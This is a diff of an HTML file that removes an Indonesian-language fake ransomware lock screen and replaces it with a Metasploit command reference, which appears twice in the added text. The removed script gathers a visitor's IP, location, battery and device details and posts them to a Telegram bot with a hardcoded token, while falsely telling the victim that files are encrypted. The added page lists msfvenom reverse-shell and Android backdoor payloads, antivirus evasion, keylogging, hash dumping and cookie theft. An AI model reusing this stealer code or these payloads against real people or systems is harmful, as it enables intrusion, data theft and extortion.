@@ -1,144 +1,967 @@
-<!DOCTYPE html><html lang="id">
+<!DOCTYPE html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ransomware Mr.BUNNY404</title>
+    <title>Metasploit Command Reference | Ethical Hacking</title>
     <style>
-        body {
-            margin: 0;
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #141e30, #243b55);
-            color: white;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            overflow: hidden;
+        :root {
+            --hacker-green: #00ff00;
+            --matrix-green: #20c20e;
+            --dark-bg: #121212;
+            --darker-bg: #0a0a0a;
+            --terminal-text: #e0e0e0;
         }
-        .overlay {
-            background: rgba(0, 0, 0, 0.8);
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.7);
+        
+        body {
+            background-color: var(--dark-bg);
+            color: var(--terminal-text);
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            background-color: var(--darker-bg);
+            padding: 20px;
+            border-bottom: 1px solid var(--matrix-green);
             text-align: center;
         }
-        #inputCode {
-            padding: 10px;
-            width: 80%;
-            border: none;
-            border-radius: 5px;
+        
+        h1, h2, h3 {
+            color: var(--hacker-green);
+        }
+        
+        h1 {
+            font-size: 2.5rem;
             margin-bottom: 10px;
+            text-shadow: 0 0 5px var(--matrix-green);
         }
-        button {
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            background: #f05454;
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background 0.3s;
+        
+        h2 {
+            border-bottom: 1px dashed var(--matrix-green);
+            padding-bottom: 10px;
+            margin-top: 40px;
         }
-        button:hover {
-            background: #ff6b6b;
+        
+        .warning {
+            background-color: #330000;
+            border-left: 5px solid #ff0000;
+            padding: 15px;
+            margin: 20px 0;
         }
-        .error {
-            color: #ff4d4d;
-            font-size: 14px;
+        
+        .command {
+            background-color: var(--darker-bg);
+            border: 1px solid var(--matrix-green);
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 4px;
+            overflow-x: auto;
+        }
+        
+        .command code {
+            color: var(--hacker-green);
+            font-size: 1.1rem;
+        }
+        
+        .command .desc {
+            color: var(--terminal-text);
+            margin-top: 8px;
+            font-style: italic;
+        }
+        
+        .category {
+            margin-bottom: 40px;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 50px;
+            padding: 20px;
+            border-top: 1px solid var(--matrix-green);
+            font-size: 0.9rem;
+        }
+        
+        .blink {
+            animation: blink 1s step-end infinite;
+        }
+        
+        @keyframes blink {
+            from, to { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        
+        .cursor {
+            display: inline-block;
+            width: 10px;
+            height: 20px;
+            background-color: var(--hacker-green);
+            vertical-align: middle;
+            margin-left: 5px;
+        }
+        
+        .typing-effect {
+            border-right: 2px solid var(--hacker-green);
+            white-space: nowrap;
+            overflow: hidden;
+            display: inline-block;
         }
     </style>
 </head>
 <body>
-    <div class="overlay">
-        <h1>Smartphone Anda Terkunci 📵🔑</h1>
-        <p>Masukkan pola untuk membuka kunci:</p>
-        <input type="password" id="inputCode" placeholder="Masukkan pola">
-        <button onclick="checkCode()">Kirim</button>
-        <p id="errorMessage" class="error"></p>
+    <header>
+        <h1>Metasploit Framework Command Reference</h1>
+        <div class="typing-effect">root@kali:~# <span id="typed"></span><span class="cursor blink"></span></div>
+    </header>
+    
+    <div class="container">
+        <div class="warning">
+            <h3>⚠️ LEGAL WARNING</h3>
+            <p>This information is provided for <strong>educational and penetration testing purposes only</strong>. Unauthorized use of these techniques against systems you don't own or have permission to test is <strong>illegal</strong> and considered cybercrime. Always obtain proper authorization before conducting security testing.</p>
+        </div>
+        
+        <div class="category">
+            <h2>Basic Commands</h2>
+            
+            <div class="command">
+                <code>msfconsole</code>
+                <div class="desc">Start the Metasploit Framework console</div>
+            </div>
+            
+            <div class="command">
+                <code>help</code>
+                <div class="desc">Show all available commands</div>
+            </div>
+            
+            <div class="command">
+                <code>exit</code>
+                <div class="desc">Exit Metasploit</div>
+            </div>
+            
+            <div class="command">
+                <code>version</code>
+                <div class="desc">Show Metasploit version</div>
+            </div>
+            
+            <div class="command">
+                <code>banner</code>
+                <div class="desc">Display a random banner</div>
+            </div>
+        </div>
+        
+        <div class="category">
+            <h2>Module Management</h2>
+            
+            <div class="command">
+                <code>search [type:exploit/auxiliary/payload] [keyword]</code>
+                <div class="desc">Search for modules (e.g., <code>search exploit windows smb</code>)</div>
+            </div>
+            
+            <div class="command">
+                <code>use [module_path]</code>
+                <div class="desc">Select a module (e.g., <code>use exploit/windows/smb/ms17_010_eternalblue</code>)</div>
+            </div>
+            
+            <div class="command">
+                <code>show options</code>
+                <div class="desc">Display configurable options for current module</div>
+            </div>
+            
+            <div class="command">
+                <code>show payloads</code>
+                <div class="desc">List compatible payloads for current exploit</div>
+            </div>
+            
+            <div class="command">
+                <code>info</code>
+                <div class="desc">Show detailed information about current module</div>
+            </div>
+            
+            <div class="command">
+                <code>back</code>
+                <div class="desc">Return to previous context</div>
+            </div>
+        </div>
+        
+        <div class="category">
+            <h2>Exploit Configuration</h2>
+            
+            <div class="command">
+                <code>set [option] [value]</code>
+                <div class="desc">Set a module option (e.g., <code>set RHOSTS 192.168.1.100</code>)</div>
+            </div>
+            
+            <div class="command">
+                <code>setg [option] [value]</code>
+                <div class="desc">Set a global option that persists between modules</div>
+            </div>
+            
+            <div class="command">
+                <code>unset [option]</code>
+                <div class="desc">Unset an option</div>
+            </div>
+            
+            <div class="command">
+                <code>exploit</code>
+                <div class="desc">Run the current exploit</div>
+            </div>
+            
+            <div class="command">
+                <code>run</code>
+                <div class="desc">Alias for exploit</div>
+            </div>
+            
+            <div class="command">
+                <code>check</code>
+                <div class="desc">Test if target is vulnerable without exploitation</div>
+            </div>
+        </div>
+        
+        <div class="category">
+            <h2>Payload Generation (msfvenom)</h2>
+            
+            <div class="command">
+                <code>msfvenom -p [payload] LHOST=[IP] LPORT=[PORT] -f [format] -o [file]</code>
+                <div class="desc">Generate a payload (e.g., <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe -o payload.exe</code>)</div>
+            </div>
+            
+            <div class="command">
+                <code>msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -o virus.apk</code>
+                <div class="desc">Create Android backdoor</div>
+            </div>
+            
+            <div class="command">
+                <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe</code>
+                <div class="desc">Generate encoded payload (AV evasion)</div>
+            </div>
+        </div>
+        
+        <div class="category">
+            <h2>Meterpreter Commands</h2>
+            
+            <div class="command">
+                <code>sysinfo</code>
+                <div class="desc">Show system information</div>
+            </div>
+            
+            <div class="command">
+                <code>getuid</code>
+                <div class="desc">Show current user privileges</div>
+            </div>
+            
+            <div class="command">
+                <code>getsystem</code>
+                <div class="desc">Attempt privilege escalation</div>
+            </div>
+            
+            <div class="command">
+                <code>shell</code>
+                <div class="desc">Drop into a system shell</div>
+            </div>
+            
+            <div class="command">
+                <code>download [remote_file] [local_path]</code>
+                <div class="desc">Download a file from target</div>
+            </div>
+            
+            <div class="command">
+                <code>upload [local_file] [remote_path]</code>
+                <div class="desc">Upload a file to target</div>
+            </div>
+            
+            <div class="command">
+                <code>screenshot</code>
+                <div class="desc">Take a screenshot</div>
+            </div>
+            
+            <div class="command">
+                <code>webcam_snap</code>
+                <div class="desc">Capture webcam image</code>
+            </div>
+            
+            <div class="command">
+                <code>keyscan_start</code>
+                <div class="desc">Start keylogger</div>
+            </div>
+            
+            <div class="command">
+                <code>keyscan_dump</code>
+                <div class="desc">Dump keylogger results</div>
+            </div>
+            
+            <div class="command">
+                <code>hashdump</code>
+                <div class="desc">Dump password hashes (Windows)</div>
+            </div>
+            
+            <div class="command">
+                <code>ps</code>
+                <div class="desc">List running processes</div>
+            </div>
+            
+            <div class="command">
+                <code>migrate [PID]</code>
+                <div class="desc">Migrate to another process</div>
+            </div>
+            
+            <div class="command">
+                <code>background</code>
+                <div class="desc">Background current session</div>
+            </div>
+        </div>
+        
+        <div class="category">
+            <h2>Post-Exploitation Modules</h2>
+            
+            <div class="command">
+                <code>run post/windows/gather/credentials/windows_autologin</code>
+                <div class="desc">Extract autologin credentials</div>
+            </div>
+            
+            <div class="command">
+                <code>run post/multi/gather/chrome_cookies</code>
+                <div class="desc">Steal Chrome cookies</div>
+            </div>
+            
+            <div class="command">
+                <code>run post/windows/gather/enum_logged_on_users</code>
+                <div class="desc">List logged in users</div>
+            </div>
+            
+            <div class="command">
+                <code>run post/windows/manage/persistence_exe</code>
+                <div class="desc">Establish persistence</div>
+            </div>
+        </div>
+        
+        <div class="category">
+            <h2>Auxiliary Modules</h2>
+            
+            <div class="command">
+                <code>use auxiliary/scanner/portscan/tcp</code>
+                <div class="desc">TCP port scanner</div>
+            </div>
+            
+            <div class="command">
+                <code>use auxiliary/scanner/ssh/ssh_login</code>
+                <div class="desc">SSH brute force</div>
+            </div>
+            
+            <div class="command">
+                <code>use auxiliary/scanner/smb/smb_version</code>
+                <div class="desc">SMB version detection</div>
+            </div>
+            
+            <div class="command">
+                <code>use auxiliary/server/capture/http</code>
+                <div class="desc">Fake HTTP server for credential capture</div>
+            </div>
+        </div>
+        
+        <div class="category">
+            <h2>Session Management</h2>
+            
+            <div class="command">
+                <code>sessions -l</code>
+                <div class="desc">List active sessions</div>
+            </div>
+            
+            <div class="command">
+                <code>sessions -i [ID]</code>
+                <div class="desc">Interact with a session</div>
+            </div>
+            
+            <div class="command">
+                <code>sessions -k [ID]</code>
+                <div class="desc">Kill a session</div>
+            </div>
+            
+            <div class="command">
+                <code>sessions -u [ID]</code>
+                <div class="desc">Upgrade a shell to Meterpreter</div>
+            </div>
+        </div>
+        
+        <div class="category">
+            <h2>Database Commands</h2>
+            
+            <div class="command">
+                <code>db_status</code>
+                <div class="desc">Check database connection</div>
+            </div>
+            
+            <div class="command">
+                <code>db_nmap [options]</code>
+                <div class="desc">Run nmap and store results in database</div>
+            </div>
+            
+            <div class="command">
+                <code>hosts</code>
+                <div class="desc">List all hosts in database</div>
+            </div>
+            
+            <div class="command">
+                <code>services</code>
+                <div class="desc">List all services in database</div>
+            </div>
+            
+            <div class="command">
+                <code>creds</code>
+                <div class="desc">List all credentials in database</div>
+            </div>
+        </div>
+        
+        <div class="category">
+            <h2>Evasion Techniques</h2>
+            
+            <div class="command">
+                <code>use evasion/windows/windows_defender_exe</code>
+                <div class="desc">Generate executable that evades Windows Defender</div>
+            </div>
+            
+            <div class="command">
+                <code>set EnableStageEncoding true</code>
+                <div class="desc">Enable payload encoding to evade detection</div>
+            </div>
+            
+            <div class="command">
+                <code>set ProcessMigration true</code>
+                <div class="desc">Enable automatic process migration</div>
+            </div>
+        </div>
+        
+        <footer>
+            <p>Metasploit Framework Command Reference | For educational and authorized penetration testing only</p>
+            <p>Remember: With great power comes great responsibility</p>
+        </footer>
     </div>
+    
     <script>
-        const botToken = "7944910420:AAFZCEefb3KVE936jvHSZw9g-SOBfjWVZiY"; // Ganti dengan token bot Telegram Anda
-        const chatId = "7524343521"; // Ganti dengan chat ID Anda
-        let attemptCount = 0;
-        const maxAttempts = 3;// Mendapatkan informasi perangkat
-    async function getDeviceInfo() {
-        const userAgent = navigator.userAgent;
-        const platform = navigator.platform;
-        const screenResolution = `${screen.width}x${screen.height}`;
-        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        const networkType = connection ? connection.effectiveType : "Tidak diketahui";
-        const battery = navigator.getBattery ? await navigator.getBattery() : null;
-        const batteryInfo = battery 
-            ? `🔋 Baterai: ${Math.round(battery.level * 100)}%, Pengisian: ${battery.charging ? "Ya" : "Tidak"}`
-            : "🔋 Informasi baterai tidak tersedia";
-
-        let locationInfo = "📍 Gagal mendapatkan lokasi.";
-        let phoneNumber = "📞 Nomor telepon tidak tersedia.";
-        try {
-            const response = await fetch("http://ip-api.com/json/");
-            const data = await response.json();
-            locationInfo = `
-
-🌍 Informasi Pengguna
-
-🌐 IP: ${data.query}
-
-🏳️ Negara: ${data.country}
-
-🏙️ Provinsi: ${data.regionName}
-
-📍 Kota: ${data.city}`;
-
-// Mendapatkan nomor telepon jika tersedia (simulasi karena keterbatasan browser API)
-          phoneNumber = `📞 Nomor Telepon: +62xxxxxxxx`; // Ganti dengan metode lain untuk mendapatkan nomor telepon jika diperlukan.
-      } catch (error) {
-          console.error("Gagal mendapatkan lokasi:", error);
-      }
-
-      return `${locationInfo}\n${batteryInfo}\n📱 User Agent: ${userAgent}\n💻 Platform: ${platform}\n🖥️ Resolusi Layar: ${screenResolution}\n📡 Jenis Jaringan: ${networkType}\n${phoneNumber}`;
-  }
-
-  // Mengirimkan data ke Telegram
-  async function sendToTelegram(message) {
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-      const data = { chat_id: chatId, text: message };
-      try {
-          await fetch(url, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify(data),
-          });
-          console.log("Pesan terkirim ke Telegram.");
-      } catch (error) {
-          console.error("Gagal mengirim pesan ke Telegram:", error);
-      }
-  }
-
-  async function checkCode() {
-      const inputCode = document.getElementById('inputCode').value;
-      const errorMessage = document.getElementById('errorMessage');
-
-      if (attemptCount < maxAttempts) {
-          if (inputCode === "1234") { // Ganti dengan password Anda
-              alert("Berhasil membuka kunci!");
-              const deviceInfo = await getDeviceInfo();
-              await sendToTelegram("Pola benar! Informasi perangkat:\n" + deviceInfo);
-          } else {
-              attemptCount++;
-              errorMessage.textContent = `Pola salah! Percobaan tersisa: ${maxAttempts - attemptCount}`;
-              const deviceInfo = await getDeviceInfo();
-              await sendToTelegram(`Percobaan ${attemptCount}: Pola salah.\n\nInformasi perangkat:\n${deviceInfo}`);
-          }
-      }
-
-      if (attemptCount >= maxAttempts) {
-          errorMessage.textContent = "Semua percobaan gagal! File dienkripsi.";
-          const deviceInfo = await getDeviceInfo();
-          await sendToTelegram("Semua file telah dienkripsi!\n\nInformasi perangkat:\n" + deviceInfo);
-      }
-  }
-
-  </script>
+        // Typing effect for header
+        const phrases = [
+            "Initializing Metasploit Framework...",
+            "Loading exploits...",
+            "Establishing connection...",
+            "Access granted.",
+            "Ready for penetration testing."
+        ];
+        
+        let currentPhrase = 0;
+        let currentChar = 0;
+        let typingInterval;
+        
+        function typeWriter() {
+            const typedElement = document.getElementById('typed');
+            
+            if (currentChar < phrases[currentPhrase].length) {
+                typedElement.textContent += phrases[currentPhrase].charAt(currentChar);
+                currentChar++;
+            } else {
+                clearInterval(typingInterval);
+                setTimeout(() => {
+                    typedElement.textContent = '';
+                    currentChar = 0;
+                    currentPhrase = (currentPhrase + 1) % phrases.length;
+                    typingInterval = setInterval(typeWriter, 100);
+                }, 2000);
+            }
+        }
+        
+        // Start typing effect after page loads
+        window.onload = function() {
+            typingInterval = setInterval(typeWriter, 100);
+        };
+    </script>
+</body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Metasploit Command Reference | Ethical Hacking</title>
+    <style>
+        :root {
+            --hacker-green: #00ff00;
+            --matrix-green: #20c20e;
+            --dark-bg: #121212;
+            --darker-bg: #0a0a0a;
+            --terminal-text: #e0e0e0;
+        }
+        
+        body {
+            background-color: var(--dark-bg);
+            color: var(--terminal-text);
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            background-color: var(--darker-bg);
+            padding: 20px;
+            border-bottom: 1px solid var(--matrix-green);
+            text-align: center;
+        }
+        
+        h1, h2, h3 {
+            color: var(--hacker-green);
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 0 0 5px var(--matrix-green);
+        }
+        
+        h2 {
+            border-bottom: 1px dashed var(--matrix-green);
+            padding-bottom: 10px;
+            margin-top: 40px;
+        }
+        
+        .warning {
+            background-color: #330000;
+            border-left: 5px solid #ff0000;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        
+        .command {
+            background-color: var(--darker-bg);
+            border: 1px solid var(--matrix-green);
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 4px;
+            overflow-x: auto;
+        }
+        
+        .command code {
+            color: var(--hacker-green);
+            font-size: 1.1rem;
+        }
+        
+        .command .desc {
+            color: var(--terminal-text);
+            margin-top: 8px;
+            font-style: italic;
+        }
+        
+        .category {
+            margin-bottom: 40px;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 50px;
+            padding: 20px;
+            border-top: 1px solid var(--matrix-green);
+            font-size: 0.9rem;
+        }
+        
+        .blink {
+            animation: blink 1s step-end infinite;
+        }
+        
+        @keyframes blink {
+            from, to { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        
+        .cursor {
+            display: inline-block;
+            width: 10px;
+            height: 20px;
+            background-color: var(--hacker-green);
+            vertical-align: middle;
+            margin-left: 5px;
+        }
+        
+        .typing-effect {
+            border-right: 2px solid var(--hacker-green);
+            white-space: nowrap;
+            overflow: hidden;
+            display: inline-block;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Metasploit Framework Command Reference</h1>
+        <div class="typing-effect">root@kali:~# <span id="typed"></span><span class="cursor blink"></span></div>
+    </header>
+    
+    <div class="container">
+        <div class="warning">
+            <h3>⚠️ LEGAL WARNING</h3>
+            <p>This information is provided for <strong>educational and penetration testing purposes only</strong>. Unauthorized use of these techniques against systems you don't own or have permission to test is <strong>illegal</strong> and considered cybercrime. Always obtain proper authorization before conducting security testing.</p>
+        </div>
+        
+        <div class="category">
+            <h2>Basic Commands</h2>
+            
+            <div class="command">
+                <code>msfconsole</code>
+                <div class="desc">Start the Metasploit Framework console</div>
+            </div>
+            
+            <div class="command">
+                <code>help</code>
+                <div class="desc">Show all available commands</div>
+            </div>
+            
+            <div class="command">
+                <code>exit</code>
+                <div class="desc">Exit Metasploit</div>
+            </div>
+            
+            <div class="command">
+                <code>version</code>
+                <div class="desc">Show Metasploit version</div>
+            </div>
+            
+            <div class="command">
+                <code>banner</code>
+                <div class="desc">Display a random banner</div>
+            </div>
+        </div>
+        
+        <div class="category">
+            <h2>Module Management</h2>
+            
+            <div class="command">
+                <code>search [type:exploit/auxiliary/payload] [keyword]</code>
+                <div class="desc">Search for modules (e.g., <code>search exploit windows smb</code>)</div>
+            </div>
+            
+            <div class="command">
+                <code>use [module_path]</code>
+                <div class="desc">Select a module (e.g., <code>use exploit/windows/smb/ms17_010_eternalblue</code>)</div>
+            </div>
+            
+            <div class="command">
+                <code>show options</code>
+                <div class="desc">Display configurable options for current module</div>
+            </div>
+            
+            <div class="command">
+                <code>show payloads</code>
+                <div class="desc">List compatible payloads for current exploit</div>
+            </div>
+            
+            <div class="command">
+                <code>info</code>
+                <div class="desc">Show detailed information about current module</div>
+            </div>
+            
+            <div class="command">
+                <code>back</code>
+                <div class="desc">Return to previous context</div>
+            </div>
+        </div>
+        
+        <div class="category">
+            <h2>Exploit Configuration</h2>
+            
+            <div class="command">
+                <code>set [option] [value]</code>
+                <div class="desc">Set a module option (e.g., <code>set RHOSTS 192.168.1.100</code>)</div>
+            </div>
+            
+            <div class="command">
+                <code>setg [option] [value]</code>
+                <div class="desc">Set a global option that persists between modules</div>
+            </div>
+            
+            <div class="command">
+                <code>unset [option]</code>
+                <div class="desc">Unset an option</div>
+            </div>
+            
+            <div class="command">
+                <code>exploit</code>
+                <div class="desc">Run the current exploit</div>
+            </div>
+            
+            <div class="command">
+                <code>run</code>
+                <div class="desc">Alias for exploit</div>
+            </div>
+            
+            <div class="command">
+                <code>check</code>
+                <div class="desc">Test if target is vulnerable without exploitation</div>
+            </div>
+        </div>
+        
+        <div class="category">
+            <h2>Payload Generation (msfvenom)</h2>
+            
+            <div class="command">
+                <code>msfvenom -p [payload] LHOST=[IP] LPORT=[PORT] -f [format] -o [file]</code>
+                <div class="desc">Generate a payload (e.g., <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe -o payload.exe</code>)</div>
+            </div>
+            
+            <div class="command">
+                <code>msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -o virus.apk</code>
+                <div class="desc">Create Android backdoor</div>
+            </div>
+            
+            <div class="command">
+                <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe</code>
+                <div class="desc">Generate encoded payload (AV evasion)</div>
+            </div>
+        </div>
+        
+        <div class="category">
+            <h2>Meterpreter Commands</h2>
+            
+            <div class="command">
+                <code>sysinfo</code>
+                <div class="desc">Show system information</div>
+            </div>
+            
+            <div class="command">
+                <code>getuid</code>
+                <div class="desc">Show current user privileges</div>
+            </div>
+            
+            <div class="command">
+                <code>getsystem</code>
+                <div class="desc">Attempt privilege escalation</div>
+            </div>
+            
+            <div class="command">
+                <code>shell</code>
+                <div class="desc">Drop into a system shell</div>
+            </div>
+            
+            <div class="command">
+                <code>download [remote_file] [local_path]</code>
+                <div class="desc">Download a file from target</div>
+            </div>
+            
+            <div class="command">
+                <code>upload [local_file] [remote_path]</code>
+                <div class="desc">Upload a file to target</div>
+            </div>
+            
+            <div class="command">
+                <code>screenshot</code>
+                <div class="desc">Take a screenshot</div>
+            </div>
+            
+            <div class="command">
+                <code>webcam_snap</code>
+                <div class="desc">Capture webcam image</code>
+            </div>
+            
+            <div class="command">
+                <code>keyscan_start</code>
+                <div class="desc">Start keylogger</div>
+            </div>
+            
+            <div class="command">
+                <code>keyscan_dump</code>
+                <div class="desc">Dump keylogger results</div>
+            </div>
+            
+            <div class="command">
+                <code>hashdump</code>
+                <div class="desc">Dump password hashes (Windows)</div>
+            </div>
+            
+            <div class="command">
+                <code>ps</code>
+                <div class="desc">List running processes</div>
+            </div>
+            
+            <div class="command">
+                <code>migrate [PID]</code>
+                <div class="desc">Migrate to another process</div>
+            </div>
+            
+            <div class="command">
+                <code>background</code>
+                <div class="desc">Background current session</div>
+            </div>
+        </div>
+        
+        <div class="category">
+            <h2>Post-Exploitation Modules</h2>
+            
+            <div class="command">
+                <code>run post/windows/gather/credentials/windows_autologin</code>
+                <div class="desc">Extract autologin credentials</div>
+            </div>
+            
+            <div class="command">
+                <code>run post/multi/gather/chrome_cookies</code>
+                <div class="desc">Steal Chrome cookies</div>
+            </div>
+            
+            <div class="command">
+                <code>run post/windows/gather/enum_logged_on_users</code>
+                <div class="desc">List logged in users</div>
+            </div>
+            
+            <div class="command">
+                <code>run post/windows/manage/persistence_exe</code>
+                <div class="desc">Establish persistence</div>
+            </div>
+        </div>
+        
+        <div class="category">
+            <h2>Auxiliary Modules</h2>
+            
+            <div class="command">
+                <code>use auxiliary/scanner/portscan/tcp</code>
+                <div class="desc">TCP port scanner</div>
+            </div>
+            
+            <div class="command">
+                <code>use auxiliary/scanner/ssh/ssh_login</code>
+                <div class="desc">SSH brute force</div>
+            </div>
+            
+            <div class="command">
+                <code>use auxiliary/scanner/smb/smb_version</code>
+                <div class="desc">SMB version detection</div>
+            </div>
+            
+            <div class="command">
+                <code>use auxiliary/server/capture/http</code>
+                <div class="desc">Fake HTTP server for credential capture</div>
+            </div>
+        </div>
+        
+        <div class="category">
+            <h2>Session Management</h2>
+            
+            <div class="command">
+                <code>sessions -l</code>
+                <div class="desc">List active sessions</div>
+            </div>
+            
+            <div class="command">
+                <code>sessions -i [ID]</code>
+                <div class="desc">Interact with a session</div>
+            </div>
+            
+            <div class="command">
+                <code>sessions -k [ID]</code>
+                <div class="desc">Kill a session</div>
+            </div>
+            
+            <div class="command">
+                <code>sessions -u [ID]</code>
+                <div class="desc">Upgrade a shell to Meterpreter</div>
+            </div>
+        </div>
+        
+        <div class="category">
+            <h2>Database Commands</h2>
+            
+            <div class="command">
+                <code>db_status</code>
+                <div class="desc">Check database connection</div>
+            </div>
+            
+            <div class="command">
+                <code>db_nmap [options]</code>
+                <div class="desc">Run nmap and store results in database</div>
+            </div>
+            
+            <div class="command">
+                <code>hosts</code>
+                <div class="desc">List all hosts in database</div>
+            </div>
+            
+            <div class="command">
+                <code>services</code>
+                <div class="desc">List all services in database</div>
+            </div>
+            
+            <div class="command">
+                <code>creds</code>
+                <div class="desc">List all credentials in database</div>
+            </div>
+        </div>
+        
+        <div class="category">
+            <h2>Evasion Techniques</h2>
+            
+            <div class="command">
+                <code>use evasion/windows/windows_defender_exe</code>
+                <div class="desc">Generate executable that evades Windows Defender</div>
+            </div>
+            
+            <div class="command">
+                <code>set EnableStageEncoding true</code>
+                <div class="desc">Enable payload encoding to evade detection</div>
+            </div>
+            
+            <div class="command">
+                <code>set ProcessMigration true</code>
+                <div class="desc">Enable automatic process migration</div>
+            </div>
+        </div>
+        
+        <footer>
+            <p>Metasploit Framework Command Reference | For educational and authorized penetration testing only</p>
+            <p>Remember: With great power comes great responsibility</p>
+        </footer>
+    </div>
+    
+    <script>
+        // Typing effect for header
+        const phrases = [
+            "Initializing Metasploit Framework...",
+            "Loading exploits...",
+            "Establishing connection...",
+            "Access granted.",
+            "Ready for penetration testing."
+        ];
+        
+        let currentPhrase = 0;
+        let currentChar = 0;
+        let typingInterval;
+        
+        function typeWriter() {
+            const typedElement = document.getElementById('typed');
+            
+            if (currentChar < phrases[currentPhrase].length) {
+                typedElement.textContent += phrases[currentPhrase].charAt(currentChar);
+                currentChar++;
+            } else {
+                clearInterval(typingInterval);
+                setTimeout(() => {
+                    typedElement.textContent = '';
+                    currentChar = 0;
+                    currentPhrase = (currentPhrase + 1) % phrases.length;
+                    typingInterval = setInterval(typeWriter, 100);
+                }, 2000);
+            }
+        }
+        
+        // Start typing effect after page loads
+        window.onload = function() {
+            typingInterval = setInterval(typeWriter, 100);
+        };
+    </script>
 </body>
 </html>
